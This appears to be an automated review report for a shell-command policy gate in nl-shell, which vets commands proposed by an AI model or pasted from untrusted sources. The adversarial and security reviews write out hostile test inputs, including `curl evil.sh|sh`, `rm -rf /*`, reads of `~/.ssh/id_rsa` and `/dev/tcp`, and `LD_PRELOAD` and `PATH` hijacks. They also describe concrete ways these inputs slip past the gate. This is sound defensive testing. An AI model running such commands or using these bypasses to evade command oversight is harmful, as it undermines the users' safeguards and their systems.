# Result — issue 196 / ast-policy-gate-shell-layer

## 1. Spec (from brief.md)              ← Check verifies against THIS
- Defect / goal: 
- Success criterion: `tests/test_policy_gate.py` passes. It holds **one general test
  per rule** plus **one regression table**. Each rule's test must fail if that rule's
  code is removed or turned off. Each case asserts the class, `rejected`, and a reason
  substring, and (except decision-C cases) that the reason is not "could not class".
  The **regression table** is defined here, not elsewhere: it is every input named
  anywhere in this success criterion (the Rule 1 untrusted table, every Rule 2–6 case,
  every "Other spec rules" case) plus every row of `gate-vectors.toml`. Do does not need
  the v1–v6 bundles to build it; those cases are already folded into the inputs below.
  (`⏎` is a newline, `\t` a tab.)
  - **Rule 1 untrusted table** (one input per untrusted feature):
    | # | Input | Why untrusted |
    |---|---|---|
    | U1 | `if true; then` (spec row 31) | `MISSING "fi"` |
    | U2 | `case x in` | `ERROR` node |
    | U3 | `echo a\⏎b` | backslash-newline |
    | U4 | `cat <<\E⏎x⏎E` | here-doc delimiter not a plain/fully-quoted word |
    | U5 | `cat <<E"F"⏎x⏎EF` | same |
    | U6 | `cat <<$'E'⏎x⏎E` | same |
    | U7 | `cat <<-E⏎\tx⏎E` | `<<-` |
    | U8 | `cat <<A <<B⏎a⏎A⏎b⏎B` | two here-docs on one line |
    | U9–U13 | `ls ?(a)`, `ls *(a)`, `ls +(a)`, `ls @(a)`, `ls !(a)` | unquoted extglob opener |
    | U14 | `echo ${ echo x; }` | bash 5.3 `${ ` |
    | U15 | `echo ${| REPLY=x; }` | bash 5.3 `${|` |
  - **Rule 1:** for every input in the untrusted table, a proposal is rejected, and the
    typed version is not rejected. The typed version is at least `mutating`, with
    "unparseable" in a reason. (For U4–U8: the untrusted-redirect clause covers file and
    dup redirects and loose operator tokens inside an `ERROR` node; a here-doc that the
    tree parsed as a here-doc node is not rejected by it, so typed U4–U8 are `mutating`,
    not rejected.) Typed `ls !(foo) 2>/dev/null` and
    `ls *.@(c|h) 2>/dev/null` are `mutating`, not rejected. Typed `echo @(x|) >&3`,
    `echo @(x|) 3>x`, `echo hi >\⏎&3` and `echo d 3\⏎>x` (no `ERROR` node; bash reads
    `3>x`) are rejected by the untrusted-redirect clause, with "unparseable" in a reason.
    Because the gate never strips backslash-newline, the last two always take this path.
  - **Rule 2:** for every input in the regression table, the number of invocations equals
    the number of `command` + `declaration_command` + `unset_command` nodes in the tree.
    `echo $((10#$(rm x)))` gives two invocations. A handler monkeypatched to skip its
    children gives decision C. A test lists every named node kind of the pinned
    `tree_sitter.Language` and asserts each has a handler; a kind whose handler is
    removed (monkeypatched) gives decision C.
  - **Rule 3:** `cat <<E | sudo tee /x` and `cat <<E | doas id` (body `x`): the second
    stage is `pipe`. `cat <x | y` and `cat <<<x | y`: `y` is `pipe`. `a | b <f`: `a` is
    `terminal` and `b` is `file`. `curl x > >(sh)` and `cat <<E > >(sudo tee /x)`: the
    inner command is `pipe`. `f() { sudo tee /x; }; cat <<E | f` and
    `f() { sh; }; curl x | f`: the body's command is `unknown`. `cat 0>&1` and
    `cat 0>&-` are `unknown`. `bash <<<'rm -rf ~'` and a quoted here-doc are `literal`
    with their text. `cat <<-E⏎\t$(rm x)⏎E` is not `literal` (tree-sitter gives its body
    no `command_substitution` node, so Rule 1's `<<-` entry is what catches it). Literal flag: `cat ~/x` has a non-literal second word, while
    `cat '~'/x` and `cat \~/x` stay literal.
  - **Rule 4:** a generated table (typed origin, so Rule 1's proposal rejection does not
    hide the result) crosses every redirect operator (`<`, `>`, `>>`, `>|`,
    `&>`, `&>>`, `<>`, `>&`, `<&`) with the descriptors none, `0`, `1`, `2`, `3`, a
    40-digit number and `{fd}`, and the target shapes: dup/close of 0–2, of 3, of `$x`;
    the move form `3-`; a literal file; `~/f`; `/dev/null`; `/dev/fd/3`; `/dev/fd/03`;
    `//dev/fd/3`; `/proc/self/fd/3`; `/proc/self/root/dev/fd/3`; `/proc/self/cwd/x`;
    `"$f"`; `/dev/f?/3`; `/dev/@(fd)/3`; `/dev/fd/3@(x|)`; `../x`. It asserts that
    exactly the forms Rule 4 allows are not rejected. Spec rows: 25 (`echo hi >&3`)
    rejected; 15 (`ls > ~/.bashrc`) `mutating`, "output redirection"; 14
    (`cat </dev/tcp/example.org/80`) `mutating`, a `/dev/tcp` reason. `>/dev/null`,
    `2>&1`, `1>&2` and `>&2` add no reason. `exec 3>&-`, `{a[0]}>x` and `{a[0]}>&-` are
    rejected.
  - **Rule 5:** the gating checks are deterministic: `$[`, `a=(` and `${` repeated to
    exactly 8 KiB each classify without raising and are not decision C because of size;
    one byte over 8 KiB is decision C, and the test asserts the parser was never called
    for it (monkeypatch the parse entry point to fail if reached). The time check is a
    loose ceiling only: each 8 KiB input classifies in under **5 s** (about 35× the
    0.14 s measured at Plan, so a slow shared CI runner does not fail correct code). It
    exists to catch a walk that blows up, not to measure speed; the size cap itself is
    proven by the deterministic check above. Deep nesting, and a long chain of substitutions that stays under the
    depth limit, are decision C. An internal error (monkeypatched) is decision C.
    `classify` never raises.
  - **Rule 6:** for every case in the test file, no reason holds a control or hidden
    character. Typed `function f$'\x1b' { :; }` gives a reason with no raw `\x1b`.
  - **Other spec rules (unchanged from v6):**
    - §1.1: row 30 (`ls ‮txt.exe`, U+202E, as a proposal) is rejected. The same text
      typed is at least `mutating`, "hidden character". A proposal with a lone surrogate
      (`ls \udcff`) is rejected.
    - §1.7 model label: `true` labelled `destructive` is `destructive`. `true` labelled
      `read-only` stays `mutating`. Both also run with `gate.rules` monkeypatched to
      return `read-only` for `true`: labelled `destructive` gives `destructive`, labelled
      `read-only` gives the §7 stub's `mutating`.
    - §7 stub proof: with `gate.rules` monkeypatched to return `read-only` for `ls`,
      `classify("ls")` is `mutating`, "live-session resolution not implemented".
      `gate.live` called directly with a `read-only` input returns the same. No other
      case returns `read-only`.
    - §2 shell-level: row 7 (`PAGER=sh git log`), row 13 (`LD_PRELOAD=./x.so ls`) and
      `LESSOPEN='|sh %s' less f` give a prefix-assignment reason. Row 16 (`$'\x72m' -rf ~`)
      and `$(echo rm) -rf ~` give a non-literal command word reason.
      `diff <(ls) <(ls)` gives a process-substitution reason. `/tmp/rm x` and `./rm x`
      give a path reason; `/usr/bin/rm x` and `//usr/bin/rm x` do not.
    - §3: a function definition is `session-altering`. The whole §3 name list
      (`docs/design/specs/policy-gate/v1.md:104-107`, with the `LD_*`, `GIT_*`, `SUDO_*`,
      `PYTHON*`, `PERL5*` patterns and `PS0`–`PS4`) is matched on every
      `variable_assignment` node, standalone or inside a `declaration_command`. Cases:
      `PATH=x`, `IFS=x`, `LD_PRELOAD=x`, `LD_LIBRARY_PATH=x`, `GIT_DIR=x`, `GIT_PAGER=x`,
      `PS1=x`, `PYTHONPATH=x`, `NODE_OPTIONS=x` and `export PATH=./bin` are
      `session-altering`, with a reason naming the variable.
    - §5: any `variable_assignment` naming `SUDO_PROMPT` or `SUDO_ASKPASS` is rejected,
      with "SUDO_" in a reason. Cases: row 23 (`SUDO_PROMPT=x sudo true`),
      `SUDO_ASKPASS=/x sudo true`, `export SUDO_PROMPT=x`.
    - Walk coverage: simple commands inside pipelines, lists, subshells, `if` / `while` /
      `for` / `case` bodies, function bodies and command substitutions all reach the
      command layer. `declaration_command` and `unset_command` are handed over as
      invocations with their command word.
    - Vectors: the conformance-row cases are read from
      `targets/ubuntu-26.04/gate-vectors.toml` through the new loader. The file is a list
      of `[[vector]]` tables. Known keys, and only these:
      - `command` (string, required);
      - `origin` (`"proposal"` or `"typed"`, required — Rule 1 makes it decisive);
      - `rejected` (bool, required);
      - `class` (one of the five classes; required when `rejected = false`, and must be
        absent when `rejected = true` — a rejected row such as spec rows 21–25 and 30,
        or `echo hi >&3`, asserts the rejection only, since the spec gives it no class);
      - `reason` (string, optional: a substring some reason must contain);
      - `label` (one of the five classes, optional: the model's label, for §1.7 rows);
      - `row` (int, optional: the spec conformance row number).

      The loader rejects, with an error naming the entry: a missing required key, `class`
      present on a rejected row or absent on a non-rejected one, a class or label outside
      the five, an `origin` outside the two, an unknown key, and invalid TOML. The file's header says it holds the rows
      landed so far and is complete (spec Conformance, `v1.md:245-249`) only when #192
      lands.

  The gate's output has the session-log `gate` shape `{"class", "reasons", "rejected"}`
  (`docs/design/specs/session-log/v1.md`).
- Repo + branch target: eduralph/nl-shell @ main
- Scope (one logical fix) / out of scope: 

## 2. Disposition claimed               ← sign-off confirms or overrides
- Outcome: new-feature
- Confidence: medium
- Recommendation: (set by Do)

## 3. Correctness (Check — chain)
- C1 Spec: none — brief.md
- C2 Reproduction (red pre-fix): none — (no gate configured)
- C3 Change: none — patch.diff
- C4 fix verified: bundle test red pre-fix, green post-fix (pytest): pass — C4 PASS — red without the fix (157 of 157 failed), green with it
- C5 Causal adequacy: none — reviewer + human sign-off

## 4. Conformance (Check — stack)
- T1 Structure: none — (no gate configured)
- T2 security-relevant change also updates the threat model: pass — security-relevant paths touched and the threat model updated: src/nl_shell/gate/__init__.py src/nl_shell/gate/live.py sr
- T3 runtime: the whole nl-shell pytest suite on the patched worktree: pass — T3 PASS — nl-shell suite green
- T4 PR body has a user-impact opener + tracker id in both artifacts: deferred — pr-description.md not drafted yet — the substantive T4 audit of the contribution artifacts runs at publish
- T5 Judgment: none — reviewer + human sign-off
- T5 judgment: → see §5.

## 5. Advisory review (artifact-only, decorrelated)
Reviewer ran without build-notes.md. Summary:

Review issue #196: add the fail-closed AST policy gate shell layer, six conservative parsing rules, and downstream stubs.

| Item | Verdict | Basis |
|------|---------|-------|
| C1 Spec | PASS | The brief defines six falsifiable rules and explicitly excludes command semantics and REPL integration; the target preserves human review of policy raises (docs/design/specs/policy-gate/v1.md:238). |
| C2 Reproduction (red pre-fix) | PASS | Frozen evidence shows all 157 tests executed and failed because the gate package was absent, with no collection errors (gate-logs/C4-verify.log:3635); independent execution is unavailable here. |
| C3 Change | PASS | Changes stay within the planned gate package, dependency pins, vectors, tests and threat-model properties; dependencies are pinned in pyproject.toml:19 and the threat-model addition begins at .oss-scanner/threat_model.md:157. |
| C4 Verification (red→green) | PASS | The captured gate demonstrates 157 green tests and 157 red tests (gate-logs/C4-verify.log:14, gate-logs/C4-verify.log:3635); this is log-backed evidence, not an independent rerun, and does not cover the additional defect below. |
| C5 Causal adequacy | NEEDS-HUMAN [impl] | Preserve ordinary words adjacent to redirects: descriptor recovery removes any adjacent word without validating it as a descriptor, losing arguments such as `secret` in `echo secret>out` and potentially a command name; add real-parser word-preservation regressions (src/nl_shell/gate/parse.py:664). |
| T1 Structure | PASS | Parsing facts, command policy, live resolution and vector validation have distinct modules, and the pipeline calls the planned downstream steps (src/nl_shell/gate/__init__.py:198). |
| T2 Shape | PASS | The threat-model gate records the required update; source inspection places the addition under “What must hold” and leaves Known gaps unchanged (gate-logs/T2-threat-model.log:10; .oss-scanner/threat_model.md:157). |
| T3 Runtime | PASS | The captured full-suite run reports 1,258 passed, one skipped and one forkpty warning; no independent runtime rerun was possible in this sandbox (gate-logs/T3-suite.log:35). |
| T4 Contribution | N/A | Contribution artifacts are intentionally drafted later; the substantive contribution audit must rerun at publish (gate-logs/T4-contribution.log:10). |
| T5 Judgment | NEEDS-HUMAN | Confirm dependency-license acceptability and the affected-path prior-art check across merged and closed/rejected work: local history contains only a synthetic base and no remotes, so the brief’s historical check cannot be independently confirmed here (pyproject.toml:19; brief.md:312). |
| Validation — fitness-to-purpose | NEEDS-HUMAN | Approve decision C, stricter redirect rejection, rejection of untrusted proposals and quoted hidden characters, and the 8 KiB cap; decide whether to record the proposal ruling on #196 or require the spec edit now, since these change accepted policy behavior (docs/design/specs/policy-gate/v1.md:238; brief.md:296; brief.md:337). |

The C5 finding is grounded on the patched target. At src/nl_shell/gate/parse.py:667–672, every adjacent token is removed from the word list when the redirect lacks a descriptor field. Unlike `_descriptor` at :775, this code never checks whether that token denotes a descriptor. The later visit of the removed node at :683 satisfies walk coverage but does not restore it to the invocation words at :695. Thus node-count tests can pass while invocation contents are incomplete. The current always-mutating stub masks the downstream classification impact.

I executed the original `_simple` function extracted with Python’s AST, supplying an explicit ordinary-argument/no-descriptor node shape for `echo secret>out`: expected words `['echo', 'secret']`, observed `['echo']`. This isolates the filtering defect; it is not a tree-sitter integration reproduction. The builder should verify `echo secret>out`, `cat /etc/passwd>out`, and `echo>out` against the pinned parser and assert complete invocation words, then retain valid descriptor-recovery cases such as `cat 0>&-`.

Independent verification limits: `python` is absent; `/usr/bin/python3` has neither pytest nor tree_sitter, and pip is absent. I therefore did not stash the target merely to attempt an unavailable test runner. I read all four frozen logs, including their command/worktree headers, and adjudicated the executed gates from their captured output. The logs show real pytest execution with the parser dependency, so they do not establish an undischarged external dependency for those runs. `git diff --check` passed locally. The wrappers belong to the harness instance and their absence from the target is expected.

The affected-path history investigation returned no commits for `src/nl_shell/gate`; the disposable repository has a single synthetic base commit and no remotes. That is insufficient to independently establish merged and closed/rejected prior art. No INTEGRATION.md is present in the supplied target; the human-only policy and dependency-license decisions explicitly identified by the brief remain above. No capability-probe symptom guard was found.

All source citations above are relative to `$PDCA_TARGET`; brief and frozen-log citations refer to the supplied review bundle. This review is advisory and does not gate acceptance.

<!-- pdca:leaf-complete -->

### Advisory — adversary

# Adversarial review — issue 196 / ast-policy-gate-shell-layer

I re-ran the bundle test at `$PDCA_TARGET` with the pdca `.venv` (tree-sitter 0.26.0): 157 of 157 pass, which matches the C4 green leg. The red leg in `gate-logs/C4-verify.log` is 157 failures, all `ModuleNotFoundError: No module named 'nl_shell.gate'`. That is expected for a new package, but it proves nothing about any single rule. The brief's "each rule's test must fail if that rule's code is removed" is a separate claim, and C4 does not check it. I then fed the production `classify` / `shell_layer` inputs aimed at the gaps, and checked each result against real bash.

- NEEDS-HUMAN [impl] — **Arguments written right before a redirect are dropped from the invocation.** `src/nl_shell/gate/parse.py:664-672` takes any word that ends exactly where an undescribed redirect starts and removes it from `word_nodes`. It does this even when `_descriptor` (`parse.py:767-779`) has already decided that the token is *not* a descriptor. Results from the patched gate: `rm -rf />/dev/null` gives words `['rm', '-rf']`, so the `/` is gone. `sudo rm -rf /etc>x` gives `['sudo', 'rm', '-rf']`. `rm -rf ~>/dev/null` gives `['rm', '-rf']`. `cat a3>f` gives `['cat']`. Bash keeps the word as an argument: `bash -c 'printf "<%s>" a /etc>out'` writes `<a></etc>`. This breaks the brief's contract ("hands each simple command … quote-removed words"). Once #197 plugs in real rules, `rm -rf />/dev/null` reaches the command layer looking like `rm -rf` with no target. Today the stub hides this (everything is `mutating`), which is why no test goes red. The Rule 4 table (`tests/test_policy_gate.py:527`) always puts a space before the redirect, so it never builds this shape. Fix: only remove the adjacent word when it is all digits or `{name}` (the same test `_descriptor` uses), and add a regression row that asserts the words of `rm -rf />/dev/null`.

- NEEDS-HUMAN [impl] — **An assignment with only a redirect and no command word is treated as a one-command prefix, so §3 misses it.** `parse.py:656-657` marks every `variable_assignment` that appears before the name as `prefix`, and `src/nl_shell/gate/__init__.py:234-235` skips §3 for prefixes. Typed `PATH=/tmp/evil >/dev/null` gives `mutating` with reasons `unparseable: missing token`, `prefix assignment: PATH`, and no `session-altering` / "assignment to PATH". `LD_PRELOAD=/tmp/x.so 2>/dev/null` and `IFS=x 2>&1` behave the same way. In bash the assignment persists: `bash -c 'PATH=/tmp/evil >/dev/null; echo $PATH'` prints `/tmp/evil`. The brief's §3 says the name list is matched on every `variable_assignment` node. A command with no name word (the code already inserts an empty non-literal word for it at `parse.py:702-705`) should give its assignments the role `standalone`.

- NEEDS-HUMAN [human] — **Rule 4's leading-`~` allowance lets a redirect reach fd 3 (nl-shell's control channel, ADR-0014).** `parse.py:326-331` accepts a `~/…` target and skips the `/dev`, `/proc`, `/sys` check for it, and `HOME` is not in `_SESSION_NAMES` (`__init__.py:51-76`). Typed `HOME=/dev/fd; echo hi >~/3` and `HOME=/proc/self/fd; echo hi >~/3` come out `mutating`, **not rejected**, with only "output redirection". In bash, `bash -c 'HOME=/dev/fd; echo hi >~/3' 3>fd3.txt` writes `hi` to fd 3. The related case `cd /dev/fd && echo hi >3` is also accepted. The brief's out-of-scope note covers only the *session's* cwd, not a `cd` on the same line. The code follows the brief as written ("apart from an optional leading `~`"), so the gap is in the brief. A human should decide between rejecting `~` targets whenever `HOME` is assigned anywhere in the line, adding `HOME` to the §3 list, or recording this as a known gap. The build notes' sign-off list does not mention it.

- NEEDS-HUMAN [human] — **`terminal` stdin is claimed without proof after `exec` redirects the shell's fd 0.** `parse.py:708-710` works out stdin only from the command's own redirects plus the redirects of the structures around it. `exec </dev/tcp/example.org/80; bash` gives `bash` stdin `terminal`, and `exec <f; sudo bash` gives `sudo bash` stdin `terminal`. In bash, every later command reads from that file or socket (`exec </dev/null; cat` reads `/dev/null`). Because `terminal` is not the worst case for the sudo-pipe rule or for decision B, #197 would be told the input is safe when it is not. `coproc sudo tee /x` also gives `terminal`, but a coproc's stdin is a pipe. The code matches the brief's definition of `terminal`. That definition does not cover a stdin change that carries over to later commands, so a human has to choose: make every command after a fd-0 `exec` `unknown`, or move this to #197 explicitly.

- **Rule 4 table gives `<>` no end-to-end check** (`tests/test_policy_gate.py:527`). Every `<>` row is hard-coded to "rejected", because tree-sitter gives it an `ERROR` node. `test_rule4_judge_alone` covers `judge_redirect` on its own, so this is a coverage note, not a refutation.

Other attacks I tried that failed: escaping in reasons (a lone surrogate and a `\x1b` function name both come out escaped); `<<<` vs `<<` here-doc counting; the trailing pipeline redirect (`a | b 2>&1 | sudo tee /x` gives `pipe` for the later stages); `0>&-` / `<&-` making stdin `unknown`; `..` and repeated slashes in `/dev/tcp`; `{a,b}>x` (wrongly rejected, but that fails closed); `$((1<<2))` (wrongly untrusted, but that also fails closed). The Rule 2 exactly-once check on every classification (`parse.py:939-955`) holds as far as I could test. Note that it proves only that every node was visited, not that the facts recorded for each node are right. The first two bullets show where those facts go wrong.

<!-- pdca:leaf-complete -->

### Advisory — security-review

# Security review (advisory): issue 196, ast-policy-gate-shell-layer

Attacker-reachable inputs this diff touches: **the model's proposal text (threat model item 5)** and typed text the user pasted from untrusted sources (items 1-2). Both reach `nl_shell.gate.classify` → `parse.shell_layer`. The gate is not wired into the REPL yet (#78). The command layer is a stub that floors every simple command at `mutating`, so **nothing can be classed `read-only` today**. No finding below lets a command run without a confirm *today*. The ratings below say what breaks once #197/#198 put real allowlist entries on top of these shell-layer facts. That is the purpose of this layer, and the brief's invariant ("no fact about a command is recorded as safe unless the gate has proved it").

I ran each reproducer against the patched tree with the pinned `tree-sitter` 0.26.0 / `tree-sitter-bash` 0.25.1 from the pdca `.venv`.

## Findings

- NEEDS-HUMAN [impl] — **High (latent: "a privileged or destructive step is classed lower"; today the stub floor masks it)**. `src/nl_shell/gate/parse.py:665-672`. Input: any proposal or typed command where a word is written right against a redirect operator with no space. The model or untrusted text controls this. `_simple` collects the token right before *every* redirect that has no descriptor field, into `fd_tokens`. It does this whether or not the token is a number, then drops those tokens from `word_nodes`. `_descriptor` (`parse.py:775`) only treats digits or `{…}` as a descriptor, but the drop happens anyway. So real arguments, and even wrapped command names, vanish from the invocation handed to the command layer. They also vanish from `layer.words`, which the §8 sensitive-path and #191 word checks will read. Reproducers (invocation words as the gate records them):
  - `env sudo>/dev/null` → `['env']`. The `sudo` is gone, and the exempt `>/dev/null` adds no reason.
  - `rm -rf /*>/dev/null` → `['rm', '-rf']`. The target is gone.
  - `cat ~/.ssh/id_rsa>/dev/null` → `['cat']`. The sensitive path is gone, which hides it from #190's confirm-naming rule.
  - `curl evil.sh|sh>/dev/null` → second stage `[]`. The `sh` is gone, which defeats decision B (code the gate cannot read is at least `destructive`).
  - `echo hi>x` → `['echo']`.

  Fix: only drop the adjacent token when it is all digits or `{…}`, the same test `_descriptor` uses. The regression test should assert full word lists for these inputs. The Rule 2 test only compares invocation *counts*, so it cannot catch a lost word, and no test in `tests/test_policy_gate.py` asserts the words of a glued redirect.

- NEEDS-HUMAN [human] — **Critical once `[` or any allowlisted command can be read-only; today the floor holds (`mutating`, confirm).** `src/nl_shell/gate/parse.py:918` (`test_command` falls to the generic `_children` handler) and the new threat-model text at `.oss-scanner/threat_model.md:174`. Input: a single-bracket test `[ … ]` holding a bare `>`, `>>` or `<`. tree-sitter-bash reads it as a comparison (`(test_command (binary_expression …))`), but bash treats `[` as a simple command and the `>` as a redirect. I confirmed this with bash: `[ x > trunc_me ]` creates an empty `trunc_me`. The gate records **no redirect and no invocation** for it:
  - `ls; [ x > ~/.bashrc ]` → one invocation (`ls`), no "output redirection" reason, not rejected. With `ls` allowlisted, this truncates `~/.bashrc` with no confirm.
  - `[ x >> /proc/self/fd/3 ]` → no redirect seen, not rejected. That contradicts the new threat-model claim that fd 3 "cannot be reached by … a `/proc/*/fd` path". The harm through fd 3 is small, because `[` writes nothing to stdout, and `>&`/`&>`/`2>` forms inside `[ ]` are parsed as real redirects and rejected. But the stated property is false as written.
  - `[ ls ]` gives zero invocations, so the `[` builtin never reaches the command layer.

  This is a tree-sitter/bash disagreement, which the brief routes to #191's differential test. A human needs to decide whether to (a) add "`>`/`<` inside a single-bracket `test_command`" to Rule 1's untrusted list now, or (b) defer it to #191 and narrow the threat-model sentence at `:174` until then. Either way, #197/#198 must not allowlist anything while this is open.

- NEEDS-HUMAN [impl] — **Medium (latent; it feeds the sudo-pipe rule and decision B).** `src/nl_shell/gate/parse.py:540-562` and `:708-710`. Input: a proposal that runs `exec` with a stdin redirect earlier in the same command line. `exec </tmp/x; sudo tee /etc/y` records `sudo tee /etc/y` with stdin **`terminal`**, but bash feeds it `/tmp/x`. Compare `{ sudo tee /etc/y; } </tmp/x`, which the gate correctly gives `file`. `terminal` is the best case for the sudo-pipe rule, so this is a stdin fact recorded as proven when it is not. Fix: after an `exec` invocation with any redirect touching fd 0 (or any `exec` redirect at all), set the stdin of every later invocation in that list to `unknown`. Add the input above to the Rule 3 test. An `exec` from an *earlier* command in the session needs live state (#192) and is out of scope here.

## Checked, no finding

- **fd 3 by redirect**: `>&3`, `x>&3` (glued), `1>&3`, `<&3`, `>& 3`, `3>&1`, `exec 3>&1`, `2>&1>&3`, `>/dev/fd/3`, `>/dev//fd/3`, `>/proc/self/fd/3`, `~/../../dev/fd/3`, `~root/f`, and `>&`/`&>`/`2>` to `/proc/self/fd/3` inside `[ ]` are all rejected.
- **Rule 6**: reasons go through `escape` (`__init__.py:94-106`). ESC and other control bytes in a target show up escaped. `GateFailure` messages are fixed text, and internal errors give only the exception type name.
- **Rule 5**: the size cap is checked before `parse_source` (`parse.py:960-963`). An 8191-byte input built to stress the `<<`-run scan in `in_heredoc_run` (700 `'<<'` words plus about 1300 `>a` redirects) classified in 0.03 s.
- **Decision C**: `classify` catches every exception (`__init__.py:151-156`).
- **Proposal rejection**: hidden characters and an untrusted tree reject a proposal. The §1.7 label only raises the class.
- **Gates**: C4 (157 tests red without the fix, green with it) and T3 (full suite green) pass in `gate-logs/`. Neither covers the three inputs above.

<!-- pdca:leaf-complete -->

## 6. NEEDS-HUMAN — items the human must clear before sign-off
- [ ] C5 Causal adequacy — Preserve ordinary words adjacent to redirects: descriptor recovery removes any adjacent word without validating it as a descriptor, losing arguments such as `secret` in `echo secret>out` and potentially a command name; add real-parser word-preservation regressions (src/nl_shell/gate/parse.py:664).
- [ ] T5 Judgment — Confirm dependency-license acceptability and the affected-path prior-art check across merged and closed/rejected work: local history contains only a synthetic base and no remotes, so the brief’s historical check cannot be independently confirmed here (pyproject.toml:19; brief.md:312).
- [ ] Validation — fitness-to-purpose — Approve decision C, stricter redirect rejection, rejection of untrusted proposals and quoted hidden characters, and the 8 KiB cap; decide whether to record the proposal ruling on #196 or require the spec edit now, since these change accepted policy behavior (docs/design/specs/policy-gate/v1.md:238; brief.md:296; brief.md:337).
- [ ] **Arguments written right before a redirect are dropped from the invocation.** `src/nl_shell/gate/parse.py:664-672` takes any word that ends exactly where an undescribed redirect starts and removes it from `word_nodes`. It does this even when `_descriptor` (`parse.py:767-779`) has already decided that the token is *not* a descriptor. Results from the patched gate: `rm -rf />/dev/null` gives words `['rm', '-rf']`, so the `/` is gone. `sudo rm -rf /etc>x` gives `['sudo', 'rm', '-rf']`. `rm -rf ~>/dev/null` gives `['rm', '-rf']`. `cat a3>f` gives `['cat']`. Bash keeps the word as an argument: `bash -c 'printf "<%s>" a /etc>out'` writes `<a></etc>`. This breaks the brief's contract ("hands each simple command … quote-removed words"). Once #197 plugs in real rules, `rm -rf />/dev/null` reaches the command layer looking like `rm -rf` with no target. Today the stub hides this (everything is `mutating`), which is why no test goes red. The Rule 4 table (`tests/test_policy_gate.py:527`) always puts a space before the redirect, so it never builds this shape. Fix: only remove the adjacent word when it is all digits or `{name}` (the same test `_descriptor` uses), and add a regression row that asserts the words of `rm -rf />/dev/null`.
- [ ] **An assignment with only a redirect and no command word is treated as a one-command prefix, so §3 misses it.** `parse.py:656-657` marks every `variable_assignment` that appears before the name as `prefix`, and `src/nl_shell/gate/__init__.py:234-235` skips §3 for prefixes. Typed `PATH=/tmp/evil >/dev/null` gives `mutating` with reasons `unparseable: missing token`, `prefix assignment: PATH`, and no `session-altering` / "assignment to PATH". `LD_PRELOAD=/tmp/x.so 2>/dev/null` and `IFS=x 2>&1` behave the same way. In bash the assignment persists: `bash -c 'PATH=/tmp/evil >/dev/null; echo $PATH'` prints `/tmp/evil`. The brief's §3 says the name list is matched on every `variable_assignment` node. A command with no name word (the code already inserts an empty non-literal word for it at `parse.py:702-705`) should give its assignments the role `standalone`.
- [ ] **Rule 4's leading-`~` allowance lets a redirect reach fd 3 (nl-shell's control channel, ADR-0014).** `parse.py:326-331` accepts a `~/…` target and skips the `/dev`, `/proc`, `/sys` check for it, and `HOME` is not in `_SESSION_NAMES` (`__init__.py:51-76`). Typed `HOME=/dev/fd; echo hi >~/3` and `HOME=/proc/self/fd; echo hi >~/3` come out `mutating`, **not rejected**, with only "output redirection". In bash, `bash -c 'HOME=/dev/fd; echo hi >~/3' 3>fd3.txt` writes `hi` to fd 3. The related case `cd /dev/fd && echo hi >3` is also accepted. The brief's out-of-scope note covers only the *session's* cwd, not a `cd` on the same line. The code follows the brief as written ("apart from an optional leading `~`"), so the gap is in the brief. A human should decide between rejecting `~` targets whenever `HOME` is assigned anywhere in the line, adding `HOME` to the §3 list, or recording this as a known gap. The build notes' sign-off list does not mention it.
- [ ] **`terminal` stdin is claimed without proof after `exec` redirects the shell's fd 0.** `parse.py:708-710` works out stdin only from the command's own redirects plus the redirects of the structures around it. `exec </dev/tcp/example.org/80; bash` gives `bash` stdin `terminal`, and `exec <f; sudo bash` gives `sudo bash` stdin `terminal`. In bash, every later command reads from that file or socket (`exec </dev/null; cat` reads `/dev/null`). Because `terminal` is not the worst case for the sudo-pipe rule or for decision B, #197 would be told the input is safe when it is not. `coproc sudo tee /x` also gives `terminal`, but a coproc's stdin is a pipe. The code matches the brief's definition of `terminal`. That definition does not cover a stdin change that carries over to later commands, so a human has to choose: make every command after a fd-0 `exec` `unknown`, or move this to #197 explicitly.
- [ ] **High (latent: "a privileged or destructive step is classed lower"; today the stub floor masks it)**. `src/nl_shell/gate/parse.py:665-672`. Input: any proposal or typed command where a word is written right against a redirect operator with no space. The model or untrusted text controls this. `_simple` collects the token right before *every* redirect that has no descriptor field, into `fd_tokens`. It does this whether or not the token is a number, then drops those tokens from `word_nodes`. `_descriptor` (`parse.py:775`) only treats digits or `{…}` as a descriptor, but the drop happens anyway. So real arguments, and even wrapped command names, vanish from the invocation handed to the command layer. They also vanish from `layer.words`, which the §8 sensitive-path and #191 word checks will read. Reproducers (invocation words as the gate records them):
- [ ] **Critical once `[` or any allowlisted command can be read-only; today the floor holds (`mutating`, confirm).** `src/nl_shell/gate/parse.py:918` (`test_command` falls to the generic `_children` handler) and the new threat-model text at `.oss-scanner/threat_model.md:174`. Input: a single-bracket test `[ … ]` holding a bare `>`, `>>` or `<`. tree-sitter-bash reads it as a comparison (`(test_command (binary_expression …))`), but bash treats `[` as a simple command and the `>` as a redirect. I confirmed this with bash: `[ x > trunc_me ]` creates an empty `trunc_me`. The gate records **no redirect and no invocation** for it:
- [ ] **Medium (latent; it feeds the sudo-pipe rule and decision B).** `src/nl_shell/gate/parse.py:540-562` and `:708-710`. Input: a proposal that runs `exec` with a stdin redirect earlier in the same command line. `exec </tmp/x; sudo tee /etc/y` records `sudo tee /etc/y` with stdin **`terminal`**, but bash feeds it `/tmp/x`. Compare `{ sudo tee /etc/y; } </tmp/x`, which the gate correctly gives `file`. `terminal` is the best case for the sudo-pipe rule, so this is a stdin fact recorded as proven when it is not. Fix: after an `exec` invocation with any redirect touching fd 0 (or any `exec` redirect at all), set the stdin of every later invocation in that list to `unknown`. Add the input above to the Rule 3 test. An `exec` from an *earlier* command in the session needs live state (#192) and is out of scope here.
- [ ] **Hidden second change with a live test on it.** Brief line 229-230 puts "an update to `.oss-scanner/threat_model.md` that states the six rules as the gate's properties" in scope. The issue body's scope list (notes.json: pins, `gate/`, §1.1 check, vectors + loader, test file) does not include it, and brief line 258 says the spec text for the raises is "#197's spec edit, not this child's" — so this child edits the threat model but not the spec it claims to implement. Worse, `tests/test_failure_classes.py:827-839` pins the "## Known gaps" section: exactly one bullet may mention `failure_classes`, and it must still contain `#12`, `bash -c`, `PATH`, `trap`, `PROMPT_COMMAND` and `2>&1 sud`. That bullet (`threat_model.md:195-209`) ends "#12 closes this" — a natural target for a Do that is "stating the gate's properties". Either drop the threat-model edit from this child, or constrain it to the "What we rely on" section and say outright that the Known-gaps `failure_classes` bullet must not change.
